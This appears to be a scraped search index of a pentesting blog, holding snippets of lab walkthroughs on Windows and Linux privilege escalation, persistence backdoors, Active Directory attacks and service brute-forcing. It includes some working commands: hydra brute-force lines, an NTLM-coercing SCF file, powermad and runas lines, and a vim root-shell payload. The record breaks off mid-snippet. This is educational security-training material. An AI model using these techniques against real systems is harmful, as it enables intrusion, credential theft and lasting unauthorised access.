"/posts/winprivsrvfile/", "categories": "Infrastructure Pentesting, Windows Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Insecure Service ExecutablesIf the original service executable is modifiable by our user, and at thesame time we can stop/start the service , then we can achieve Privilege Escalation if the service runs with a SYSTEM privileges by simply replacing the original executable with our reverse shell executable.EnumerationWe are going to exploit insecure service to escalate our privileges to SYSTEM. Let’s check our current user.Now, We will be using powerup.ps1 script to conduct an enumeration on the available services. Let’s import powerup.ps1 and execute Get-ServiceFilePermission to get the list of services that are vulnerable.As you can see, filepermsvc is vulnerable to insecure service executable, which means we can be able to replace the original executable with our reverse shell executable.We can confirm it using Get-Acl command.To be able to exploit a service and escalate our privileges, we need to: be able to start/stop the service have the service runs with higher privilegesWe are going to check the above conditions using accesschk.exe and sc.exe, if all the conditions are satisfied, we can achieve privilege escalation.Let’s execute accesschk /accepteula -cqv user filepermsvc .Well…As you can see, we have permission to start/stop the service.We will execute sc qc filepermsvc to check whether or not the service runs with SYSTEM privilege.Nice!! It runs with SYSTEM privilege. All conditions are satisfied, so we are going to exploit the service.ExploitationWe are going replace the original executable of the service with our own reverse shell executable.Now, we will setup our reverse shell listener and start the service by executing net start filepermsvc.Well…As you can see, we have obtained shell with SYSTEM privilege." }, { "title": "Insecure GUI Apps", "url": "/posts/winprivgui/", "categories": "Infrastructure Pentesting, Windows Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Insecure GUI AppsOn some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges. There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges.ExploitationWe are going to exploit AdminPaint to escalate our privileges to Admin.We will click on AdminPaint application.Note: You can check the privilege onwhich the application is running by examining its process.click on File-&amp;gt;Open and then replace the path with the path of command prompt c:\\Windows\\syste32\\cmd.exe.Well…As you can see, we have obtained cmd with Admin privilege." }, { "title": "VNC Pentesting", "url": "/posts/vnc/", "categories": "Infrastructure Pentesting, VNC", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "VNCVirtual Network Computing (VNC) is a graphical desktop-sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another, relaying the graphical-screen updates back in the other direction, over a network.EnumerationScanning With NmapWe can use nmap to scan vnc as well as to get the version of vnc running on our target system.nmap -sT -sV -p 5901 [target_ip]Above image shows vnc is running on port 5901/tcp on our target. It also reveals the version of vnc running, which was version 3.8.We can also use nmap script to get more information about vnc protocol.nmap -sT --script vnc-info.nse -p 5901 [target_ip]Bruteforcing Vnc PasswordhydraUsing hydra , we can bruteforce password of vnc, which if successful will allow us to login to our target system.hydra -s [vnc_port] -P [/path/to/password/wordlist] [target_ip] vncIn the above image we were able to get a valid password pass1234.ExploitationWith the valid password in hand, we can login to our target system using vncviewer.vncviewer [target_ip]:[port]References https://en.wikipedia.org/wiki/Virtual_Network_Computing https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc" }, { "title": "Unconstrained delegation", "url": "/posts/unconst/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Unconstrained delegationThis is a feature that a Domain Administrator can set to any Computer inside the domain. Then, anytime a user logins onto the Computer, a copy of the TGT of that user is going to be sent inside the TGS provided by the DC and saved in memory in LSASS. So, if you have Administrator privileges on the machine, you will be able to dump the tickets and impersonate the users on any machine. So if a domain admin authenticates to a computer with “Unconstrained Delegation” feature activated, and you have local admin privileges inside that machine, you will be able to dump the ticket and impersonate the Domain Admin.EnumerationPowerviewTo execute an unconstrained delegation attack, we need to have administrative privilege on the machine. There multiple ways to check whether or not we have administrative privileges on the system, but here we will be using Find-Localadminaccess from powerview, which will check to see if we are local admin on the machine.As you can see, we were localadmin on OPS.cyber.local, which was the current machine.Since we are localadmin on the machine, we will execute the below commands to determine whether or not the machine has unconstrained delegation enabled.get-netcomputer -unconstrained | select samaccountnameExploitationBefore exploitation, let’s try to get access to dc.Here, we couldn’t access the dc because we didn’t have the privileges.We will execute sekurlsa::tickets /export in mimikatz and export the available TGTS.As you can see we have exported the TGS but there was no ticket for administrator.Since we don’t have TGT of administrator, we will wait unti the administrator authenticates to the machine so that his TGT gets cached.For this purpose, we will login to domain controller and make administrator authenticates to the machine.We have made administrator to authenticate to the compromised machine. Now we will go back to the compromised machine and use mimikatz to export the TGT of the administrator.Nice!. We got TGT of the administrator.With the TGT of the administrator retrieved, we will use mimikatz to pass the ticket and get access to dc.Now we can access the dc.References https://stealthbits.com/blog/unconstrained-delegation-permissions/ https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation" }, { "title": "Telnet Pentesting", "url": "/posts/telnet/", "categories": "Infrastructure Pentesting, telnet", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "TelnetTelnet is a networking protocol and software program used to access remote computers and terminals over the Internet or a TCP/IP computer network. It runs on port 23 by default.EnumerationScanning With NmapWe can use nmap to scan telnet service which by default runs on port 23.nmap -sT -sV -p 23 [target_ip]Above image shows telnet is running on port 23/tcp on our target.Bruteforcing TelnethydraUsing hydra , we can bruteforce credentials of telnet, which if successful will allow us to login to our target system.hydra -l [username] -P [/path/to/password/wordlist] telnet://[target_ip]In the above image we were able to get a valid credential user1:user1.ExploitationTelnet ClientWith the valid password in hand, we can login to our target system using telnet client.In the above, we were able to login to the system.MetasploitWe can also obtain command shell with metasploit.SniffingTraffic sent to and received from telnet is not encrypted. An attacker can take advantage of this to sniff telnet traffic and retrieve a clear-text credential.WiresharkAnalysing telnet traffic revealed the clear-text credential of telnetReferences https://www.techopedia.com/definition/2457/telnet-tn https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet" }, { "title": "Startup Apps", "url": "/posts/startup/", "categories": "Infrastructure Pentesting, Windows Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Startup AppsEach user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.EnumerationWe are going to exploit Startup Apps to escalate our privileges to Admin. Let’s check our current user.Now, We will use Get-Acl in powershell to conduct an enumeration on the startup directory.Well..We have Full Control on startup directory. Which means we can be able to place our own reverse shell executable, so that if anyone logins i.e admin, we will obtain his shell.ExploitationWe are going copy our reverse shell executable to the startup directory.Well…for the purpose of demonstration, we will setup our reverse shell listener, restart the system and then login with admin account.Well…As you can see, we have obtained shell with Admin privilege." }, { "title": "SNMPv1,SNMPv2,SNMPv2c Pentesting", "url": "/posts/snmp/", "categories": "Infrastructure Pentesting, SNMP", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "SNMPSimple Network Management Protocol (SNMP) is a protocol for network management. It is used to monitor different devices in the network (like routers, switches, printers, IoTs…). It runs on port 161/udp.EnumerationScanning With NmapWe can use nmap to scan snmp as well as to get the version of snmp running on our target system.nmap -sU -sV -p 161 [target_ip]Above image shows snmp is running on port 161/udp on our target. It also reveals the version of snmp running, which was snmpv1Bruteforcing Community StringSNMP version 1,2 and 2c use community string for authentication. Community String is similar to a user ID or password that is sent along with each SNMP Get-Request to get access to the devices’ information.If the community string is correct, you’re given access to the devices’ statistics and if the string is wrong, the devices simply ignore the request and do not respond to it.in order to access the information on snmp, you need to know the community string, which can be bruteforced using tools like hydra and nmap.NmapWe can use nmap to bruteforce snmp community string.nmap -sU --script snmp-brute.nse -p 161 [target_ip]From the above image, we were able to get public as the valid community string of the target snmp.HydraWe can also use hydra to bruteforce snmp community string.hydra -P [/path/to/wordlist.txt] -v [target_ip] snmpFrom the above image, we were able to get public as the valid community string of the target snmp.ExploitationWith the valid community string in hand, we may get lot of information about the host and network devices, we may get ipv4 and ipv6 addresses, usernames, OS version, Services, Processes, Emails, Passwords and much more.snmpwalkWe can use snmpwalk to get lot of information from snmp.snmpwalk -v [version of snmp] -c [community string] [target_ip]As you can see from the image above, snmpwalk was fetching lot of information from snmp.Note: As most of the information getting from snmp are huge, we recommend saving it in a file.AnalysisAfter saving the outputs in a file, we analysed the file which we were able to get OS version, Email Address, Ethernet In Use, Ip Address, running process and running services.Os Version and Email AddressEthernet In UseIpv4 Addressesmysql processApache runningReferences https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp" }, { "title": "SMBRelay", "url": "/posts/smbrelay/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "SMBRelaySMB signing is a security mechanism that allows digitally signing SMB packets to enforce their authenticity and integrity - the client/server knows that the incoming SMB packets they are receiving are coming from a trusted source and that they have not been tampered with while in transit, preventing man in the middle type attacks.If SMB signing is disabled, packets can be intercepted/modified and/or relayed to another system.ExploitationFor SMBRelay to be successfull, three condition must be met :- SMB signing must be disabled on our target machine. Relayed user credential must be admin on the target machine.We will use nmap to scan for host with SMB Signing disabled.We got two host 10.42.0.30 and 10.42.0.70 with smb signing disabled.We will run smbrelayx.py that will listen for smb traffics and relay them to our target system 10.42.0.30 and then execute “whoami /user” commands on the target.We will create a malicious file that will force the target machine to try to authenticate with our machine, which will allow us to obtain ntlm hash of the user.[Shell]Command=2IconFile=\\\\[kali_ip_here]\\\\share\\noexist.txt[Taskbar]Command=ToggleDesktopNow we will save it in .scf file and then send it to the user. If the user opens the folder inwhich our file is placed, we will be able to execute smbrelay attack.Let’s login to the victim machine and browse the file.Now let’s go back to our machine .We have successfully executed command on our target system.References https://docs.microsoft.com/en-us/archive/blogs/josebda/the-basics-of-smb-signing-covering-both-smb1-and-smb2 https://www.ired.team/offensive-security/lateral-movement/lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing" }, { "title": "Silver Ticket", "url": "/posts/silver/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Silver TicketIs an attack that allows attacker who has the password hash of a target service(MSSQL, CIFS, Sharepoint) to forge Kerberos ticket-granting tickets (TGT) that will enable attacker to generate authentication material for the target service. This ticket is known as silver ticket.Silver tickets are more limited in scope than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.ExploitationTo forge silver ticket, we need to get password hash of the service using any credential access technigues. Since the password of a machine account is thesame as the password of cifs service, we will use the password hash of the domain controller to forge silver ticket of cifs service. This will allow us to access share of the domain controller.Let’s try to access c$ share of the domain controllerAs you can see, we were not able to access it because we didn’t have required privileges. Now we will forge the silver ticket to see if we can access it.Since we have the password hash of the domain controller (By dumping sam database), we will load mimikatz and forge the silver ticket for cifs service.We will then pass the ticket.Now let’s try to access c$ share of the domain controller again.Great.References https://attack.mitre.org/techniques/T1558/001/" }, { "title": "Local User Account", "url": "/posts/pwuser/", "categories": "Infrastructure Pentesting, Windows Persistence", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Local User AccountIf we compromised an Administrator, we can create a user and add him to an Administrators group.ExploitationWe are going to create a user and add him to an Administrator group.Now we will have an elevated privilege whenever we login to backdoor account" }, { "title": "Startups", "url": "/posts/pwstartup/", "categories": "Infrastructure Pentesting, Windows Persistence", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "StartupsEach user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp. If we compromise an administrator, we can place our reverse shell in this directory, so that to be executed automatically when user logs in.ExploitationLet’s place our reverse shell executable to the startup directory.We need to wait for a user to log in so that to get our payload executed. for the purpose of demonstration, we will restart the system and logs in again.Nice!" }, { "title": "Registry Autoruns", "url": "/posts/pwautorun/", "categories": "Infrastructure Pentesting, Windows Persistence", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Registry AutorunsWindows can be configured to run commands at startup. If we compromise an administrator’s account, we can add our reverse shell to Registry Run Keys, so that to be triggered each time the system boots up.ExploitationWe are going to exploit registry AutoRuns to achieve persistenceNow we will place our reverse shell executable to the directory we specified in the registry.We need to wait for the system to restart so that to get our payload executed. for the purpose of demonstration, we will restart the system .Nice!" }, { "title": "Local User Account", "url": "/posts/puser/", "categories": "Infrastructure Pentesting, Linux Persistence", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Local User AccountIf we have root privilege, we can create a user and add him to a root.ExploitationWe are going to create a user and add him to a root group.Now we will have a root privilege whenever we login to backdoor account" }, { "title": "Pass The Ticket(Ptt)", "url": "/posts/ptt/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Pass The Ticket(Ptt)Pass the Ticket(Ptt) is a credential theft technique that enables adversaries to use stolen Kerberos tickets to authenticate to resources (e.g., file shares and other computers) as a user without having to compromise that user’s password.ExploitationTo execute a pass the hash ticket, we need to first obtain the kerberos TGT of the target user using any kind of techniques. In this case we have the kerberos TGT of an administrator, so we are going to execute ptt attack using mimikatz.As you can see, we have successfully passed the ticket of the administrator. We can now access the powershell session of the domain controller by executing enter-pssession [dc].References https://stealthbits.com/blog/how-to-detect-pass-the-ticket-attacks/" }, { "title": "Pass The Hash(Pth)", "url": "/posts/pth/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Pass The Hash(Pth)Pass the hash is a type of cybersecurity attack in which an adversary steals a “hashed” user credential and uses it to create a new user session on the same network. Unlike other credential theft attacks, a pass the hash attack does not require the attacker to know or crack the password to gain access to the system. Rather, it uses a stored version of the password to initiate a new session.ExploitationTo execute a pass the hash attack, we need to first obtain the hash of the target user using any kind of credential access techniques. In this case we have the hash of an administrator, so we are going to execute pth attack using evil-winrm.evil-winrm -i [ip] -u [user] -H [hash]As you can see, we got system shell of the administrator.References https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/" }, { "title": "SSH Authorized_keys", "url": "/posts/pssh/", "categories": "Infrastructure Pentesting, Linux Persistence", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "SSH Authorized_keysThe ssh backdoor essentially consists of leaving our ssh keys in some user’s home directory. Usually the user would be root as it’s the user with the highest privileges.ExploitationWe are going to leverage ssh protocol to achieve persistence. We will generate a set of ssh keys with ssh-keygen.Now that we have 2 keys. 1 private key and 1 public key, we can now go to /root/.ssh, rename our public key to authorized_keys and then leave it there.After that, we will copy our private key to our machine and use it to login to root account whenever we want." }, { "title": "Scheduled Tasks", "url": "/posts/pshctask/", "categories": "Infrastructure Pentesting, Windows Persistence", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Scheduled TasksWe can achieve persistence by adding our reverse shell payload to scheduled task. We could even just configure a task where every minute a reverse shell is sent to you. Which is exactly what we’re going to do.ExploitationWe are going to leverage schtasks to achieve persistence. We will create a reverse shell executable and make it to run every minute .Now , we will setup our reverse shell listener and wait for our script to be triggered." }, { "title": "Token Impersonation — PrintSpoofer", "url": "/posts/printspooler/", "categories": "Infrastructure Pentesting, Windows Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Token Impersonation — PrintSpooferFor this exploit to work, we need local service or network service access and with SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enabled.EnumerationWe are going to exploit SeImpersonatePrivilege to escalate our privileges to SYSTEM. For this to work, we need local service with either SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enabled. Let’s examine itAs you can see, we have local service account here. Let’s examine the privileges.Well.. SeImpersonatePrivilege is enabled, which means we can abuse it to escalate our privilege.ExploitationWe will use printspoofer.exe to abuse the privilege.Well…As you can see, we have obtained cmd with SYSTEM privilege." }, { "title": "Cronjob", "url": "/posts/pcron/", "categories": "Infrastructure Pentesting, Linux Persistence", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "CronjobOnce you got root access on any host, you can add any scheduled task. You could even just configure a task where every minute a reverse shell is sent to you. Which is exactly what we’re going to do.ExploitationWe are going to leverage cronjob to achieve persistence. We will create a reverse shell script and add it to /etc/crontab so that to be executed automatically.Now , we will setup our reverse shell listener and wait for our script to be triggered." }, { "title": ".bashrc", "url": "/posts/pbash/", "categories": "Infrastructure Pentesting, Linux Persistence", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": ".bashrcIf a user has bash as their login shell, the “.bashrc” file in their home directory is executed when an interactive session is launchedExploitationWe are going to leverage .bashrc file to achieve persistence. We will create a reverse shell payload and add it to .bashrc file so that to be executed automatically when user logs in.Now , we will setup our reverse shell listener and wait for a root user to logs in." }, { "title": "Password Spraying", "url": "/posts/passspray/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Password SprayingIs an attack that uses a single or small list of passwords against many different accounts to attempt to acquire valid account credentials.ExploitationWe have got a valid credential of user saifullah, we will try to enumerate users from the domain and then execute password spray attack against the users using the password of saifullah.Let’s enumerate users with crackmapexec.crackmapexec smb [ip] -u saifullah -p sPassword@123 --usersSince we have got the list of users, we will execute password spray attack against them with the password of saifullah sPassword@123 as the password.As you can see, we got three accounts using thesame passwords.References https://attack.mitre.org/techniques/T1110/003/" }, { "title": "NTLMRelay", "url": "/posts/ntlmrelay/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "NTLMRelaySMB signing is a security mechanism that allows digitally signing SMB packets to enforce their authenticity and integrity - the client/server knows that the incoming SMB packets they are receiving are coming from a trusted source and that they have not been tampered with while in transit, preventing man in the middle type attacks.If SMB signing is disabled, packets can be intercepted/modified and/or relayed to another system.ExploitationFor ntlmrelay to be successfull, three condition must be met :- SMB signing must be disabled on our target machine. Relayed user credential must be admin on the target machine.We will use nmap to scan for host with SMB Signing disabled.We got two host 10.42.0.30 and 10.42.0.70 with smb signing disabled.We will run responder with HTTP and SMB set to OFF.at the same time, we will run ntlmrelayx.py that will listen for ntlm traffics and relay them to our target system 10.42.0.30 and then execute “whoami /user” commands on the target.Now we will go back to the victim machine and try to access file that does not exist.Now let’s go back to our machine .We have successfully executed command on our target system.References https://docs.microsoft.com/en-us/archive/blogs/josebda/the-basics-of-smb-signing-covering-both-smb1-and-smb2" }, { "title": "LLMNR/NBT-NS Poisoning", "url": "/posts/ntlmhash/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "LLMNR/NBT-NS PoisoningBy responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.ExploitationFor this purpose, we will use responder to retrieve the ntlm hash of the victim, and then crack it with john.Let’s run our responder to listen for ntlm traffic.Now we will go to our victim machine and try to access a resources that does not exist.Let’s go back to our machine.As you can see, we have retrieved ntlm hash of administrator. We will save it in a file and crack it using john.References https://attack.mitre.org/techniques/T1557/001/" }, { "title": "Machine Account -&gt; Privileged Group", "url": "/posts/mag/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Privileged GroupMachine accounts could be added to privileged groups for establishing domain persistence.Note: This is a domain persistence technigue, therefore, assume we have compromised domain administrator&#39;s account and we are trying to achieve persistence in the domain.ExploitationSince we have compromised administrator account, we will create a new machine account using powermad and add it to domain admins group.new-machineaccount -machineaccount backdoor -domain cyber.local -domaincontroller dc01.cyber.localAs you can see, we have created new machine backdoor.We will now add the machine to Domain Admins group.Our machine account has been added to Domain Admins.We will login to our newly created machine account backdoor and get powershell session of the domain controller.runas /netonly /user:cyber.local\\backdoor$ cmd.exeDone.References https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/" }, { "title": "Machine Account -&gt; UserAccountControl", "url": "/posts/machuser/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "UserAccountControlUser-Account-Control Attribute Flags that control the behavior of the Microsoft Active Directory user account. It contains a range of flags which define some important basic properties of a user object. These flags can also be used to request or change the status of an account.SERVER_TRUST_ACCOUNT is a User-Account-Control flag that makes computer account to appear as domain controller. It has hexadecimal value of 0x2000.The trick here is that, we will modify the flag of useraccountcontrol attribute to have SERVER_TRUST_ACCOUNT, This will turn the machine to domain controller allowing us to execute dcsync attack on the domain and retrieve user’s credential. This is possible because any machine account with SERVER_TRUST_ACCOUNT flag set will have the Replications right.Note: This is a domain persistence technigue, therefore, assume we have compromised domain administrator&#39;s account and we are trying to achieve persistence in the domain.ExploitationSince we have compromised administrator account, we will abuse UserAccountControl attribute to achieve domain persistence.To do that, we will create a new machine account using powermadnew-machineaccount -machineaccount backdoor -domain cyber.local -domaincontroller dc01.cyber.localAs you can see, we have created new machine backdoor.We will check the UserAccountControl attribute to see the flag assigned to it.Here the value of useraccountcontrol was WORKSTATION_TRUST_ACCOUNT. Therefore, we are going to change the flag to SERVER_TRUST_ACCOUNT which will turn the machine to domain controller, thereby giving it Replications right which will allow us to execute dcsync attack and retrive user’s credential whenever we want.As you can see, the useraccountcontrol has been changed to SERVER_TRUST_ACCOUNT.To execute dcsync attack, we will login to our newly created machine account backdoor.runas /netonly /user:cyber.local\\backdoor$ cmd.exeNow we will load mimikatz and execute lsadump::dcsync /user:krbtgt to retrieve credential of krbtgt account.Done.References https://ldapwiki.com/wiki/User-Account-Control%20Attribute https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties" }, { "title": "SUID / SGID Executables - Shared Object Injection", "url": "/posts/linprivsuidsharedobj/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "SUID / SGID Executables - Shared Object InjectionEnumerationWe are going to exploit a vulnerable suid/sgid executable to escalate our privileges to root. Let’s find all the SUID/SGID executables on the machine.As you can see, suid/sgid is set on suid-so. We will run strace on the file i.e suid-so and search the output for open/access calls and for “no such file” errors.Here… the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found. Since suid-so is running with a root privilege, if we can be able to create a malicious shared object and place it in /home/user/.config, we will make the suid-so to load our malicious shared object which will provide us with an elevated shell.ExploitationWe are going to compile this shared object code and place it in the target directory /home/user/.config, so if suid-so is executed it will load our malicious shared object.Great!" }, { "title": "SUID / SGID Executables - Known Exploits", "url": "/posts/linprivsuidexploit/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "SUID / SGID Executables - Known ExploitsEnumerationWe are going to exploit a vulnerable suid/sgid executable to escalate our privileges to root. Let’s find all the SUID/SGID executables on the machine.As you can see, suid/sgid is set on exim-4.84-3. By searching on exploit-db, we found out that it’s vulnerable to local privilege escalationExploitationWe will copy the exploit and execute it on our target machine, which if successful will provide us with a root shell." }, { "title": "SUID / SGID Executables - Environment Variables", "url": "/posts/linprivsuidenv/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "SUID / SGID Executables - Environment VariablesEnumerationWe are going to exploit a vulnerable suid/sgid executable to escalate our privileges to root. Let’s find all the SUID/SGID executables on the machine.As you can see, suid/sgid is set on suid-env. We will run strings on the file to look for a strings of printable characters.As you can see here, this line service apache2 start suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.ExploitationWe will create an executable file with thesame name as service, prepend the current directory (or where the new service executable is located) to the PATH variable, and then run the suid-env executable to gain a root shell.Great!" }, { "title": "SUDO - LD_PRELOAD", "url": "/posts/linprivshellescen/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "SUDO - LD_PRELOADLD_PRELOAD is a function that allows any program to use shared libraries. If the env_keep option is enabled, we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.EnumerationExploitation" }, { "title": "Shell Escape Sequences", "url": "/posts/linprivshellesc/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Shell Escape SequencesThe sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.EnumerationWe are going to exploit this misconfiguration to escalate our privileges to root. Let’s check the list of a programs that can be run with root privilege by executing sudo -lWe will be using GTFobins https://gtfobins.github.io/ to exploit these applications that are set to run with sudo privileges.ExploitationiftopLet’s check gtfobins to see whether there is a way to exploit iftop .Well..we got it. We will follow the given procedure to exploit it and escalate to root.findLet’s check gtfobins to see whether there is a way to exploit find .Well..we got it. We will follow the given procedure to exploit it and escalate to root.nanoLet’s check gtfobins to see whether there is a way to exploit nano .Well..we got it. We will follow the given procedure to exploit it and escalate to root.vimLet’s check gtfobins to see whether there is a way to exploit vim .Well..we got it. We will follow the given procedure to exploit it and escalate to root.manLet’s check gtfobins to see whether there is a way to exploit man .Well..we got it. We will follow the given procedure to exploit it and escalate to root.awkLet’s check gtfobins to see whether there is a way to exploit awk .Well..we got it. We will follow the given procedure to exploit it and escalate to root.lessLet’s check gtfobins to see whether there is a way to exploit less .Well..we got it. We will follow the given procedure to exploit it and escalate to root.ftpLet’s check gtfobins to see whether there is a way to exploit ftp .Well..we got it. We will follow the given procedure to exploit it and escalate to root.nmapLet’s check gtfobins to see whether there is a way to exploit nmap .Well..we got it. We will follow the given procedure to exploit it and escalate to root.moreLet’s check gtfobins to see whether there is a way to exploit more .Well..we got it. We will follow the given procedure to exploit it and escalate to root." }, { "title": "Writable /etc/shadow", "url": "/posts/linprivshadoww/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Writable /etc/shadowThe /etc/shadow file contains user password hashes and is usually readable only by the root user.EnumerationWe are going to exploit a misconfigured /etc/shadow file to escalate our privileges to root. Let’s check the permission on /etc/shadow.As you can see, we have Write permission on /etc/shadow file.ExploitationWe will generate a new password and edit the /etc/shadow file by placing the root hash with the one we have generated. After that, we will use the password to login to root account.Well…As you can see, we have logged in as root user." }, { "title": "Readable /etc/shadow", "url": "/posts/linprivshadow/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Readable /etc/shadowThe /etc/shadow file contains user password hashes and is usually readable only by the root user.EnumerationWe are going to exploit a misconfigured /etc/shadow file to escalate our privileges to root. Let’s check the permission on /etc/shadow.As you can see, we have Read permission on /etc/shadow file.ExploitationWe will extract the hash of a root user and crack it using johntheripper. After that, we will use the cracked password to login to root account.Well…As you can see, we have logged in as root user." }, { "title": "Writable /etc/passwd", "url": "/posts/linprivpasswd/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "/etc/passwdThe /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user.EnumerationWe are going to exploit a misconfigured /etc/passwd file to escalate our privileges to root. Let’s check the permission on /etc/passwd.As you can see, we have write permission on /etc/passwd file.ExploitationWe will generate a new password and edit the /etc/passwd file by placing the generated password hash between the first and second colon (:) of the root user’s row (replacing the “x”). This will replace the password of the root user. After that, we will use the password to login to root account.Well…As you can see, we have logged in as root user." }, { "title": "Capabilities", "url": "/posts/linprivpassf/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "CapabilitiesSystem administrators can use capabilities to increase the privilege level of a process or binary. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.EnumerationWe are going to exploit a capabilities to escalate our privilges to root. Let’s check the available capabilities that are enabled.As you can see, /home/karen/vim has capabilities enabled. Let’s check GTFobins to see if there is a way to exploit it.Well..we got it. We will follow the given procedure to exploit it and escalate to root.ExploitationWe will execute this payload on our target machine ./vim -c &#39;:py3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;, which if sucessful will allow us to escalate to root." }, { "title": "Cron Jobs - Wildcards", "url": "/posts/linprivcronwild/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Cron Jobs - WildcardsEnumerationWe are going to exploit Wildcards * to escalate our privileges to root. Let’s check the content of a crontab /etc/crontabAs you can see, tar is set to run with wildcard * in /home/user, which is our current user’s home directory . Since we have write permission to the directory and it is set to run with root privilege, we can take advantage of the wildcard to escalate our privilege to root.ExploitationWe will create a reverse shell payload from our kali and then transfer it to our target machine, After that, we will create the following files in our target directory /home/user. This will make the cronjab to execute tar with the name of the created files as it flags, which will trigger our reverse shell payload with root privilege.Now We will setup a reverse shell listener and wait for cronjob to execute our payload.Well…As you can see, we have obtained a shell with root privilege." }, { "title": "Cron Jobs - File Permissions", "url": "/posts/linprivcronp/", "categories": "Infrastructure Pentesting, Linux Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Cron Jobs - File PermissionsEnumerationWe are going to exploit a misconfigured script to escalate our privileges to root. Let’s check the content of a 